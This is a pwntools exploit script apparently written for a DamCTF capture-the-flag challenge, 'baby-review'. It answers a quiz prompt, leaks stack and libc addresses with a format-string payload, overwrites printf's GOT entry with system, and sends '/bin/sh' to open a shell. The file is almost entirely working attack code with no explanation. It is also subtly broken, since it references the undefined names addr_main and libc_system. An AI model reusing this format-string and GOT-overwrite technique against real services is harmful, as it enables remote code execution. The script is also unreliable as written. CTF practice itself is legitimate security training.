# -- coding: utf-8 --
from countryinfo import CountryInfo
from pwn import *
import time
context.arch = 'amd64'
context.log_level = 'debug'
# ENV
PORT =  30888
HOST = "chals.damctf.xyz"

e = context.binary = ELF('./baby-review')
# lib = e.libc
lib = ELF('libc.so.6')
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
    
def send_num(r, num, wait=True):
    if wait:
        r.recvuntil(b"4. Exit\n")
    r.sendline(num)
    
r.recvuntil("capital of ")
country = ((r.recv(20))).decode('utf-8')
country = country.replace('?', '')
capital = CountryInfo(country.strip()).capital()
payload =capital
pause()
r.sendline(payload)

# menu
pause()
r.sendline(b"5")

pause()
payload=b"main: %51$p\nputs+346: %45$p \n"
r.send(payload)

pause()
r.sendline(b"2")

r.recvuntil(b"main: ")
main = int(r.recvline().strip(),16)
print(hex(main))
r.recvuntil(b"puts+346: ")
puts = int(r.recvline().strip(),16)
print(hex(puts))
lib.address = puts - lib.sym['puts']-346
print(hex(lib.address))
syscall =lib.sym['syscall']+ lib.address 

rip=main-0x3A #menu
rbp=main+0x3000+1000
read_review = main-432
read_bye =main-(0x15E6-0x158E)
got_printf = addr_main + 10912

fsb_payload = fmtstr_payload(10, { got_printf: libc_system })

print(fsb_payload)
send_num(r, b"5")
r.recvuntil(b"Enter your movie link here and I'll add it to the list\n")
r.sendline(fsb_payload)
send_num(r, b"2")

r.recvuntil(b"https://www.youtube.com/watch?v=Icx4xul9LEE\n")
r.recvline()
send_num(r, b"5")
r.recvuntil(b"Enter your movie link here and I'll add it to the list\n")
r.sendline(b"/bin/sh")
send_num(r, b"2")

r.interactive()



# tạo chương trình có lỗ hổng 
# build docker với file 
# tạo code exploit
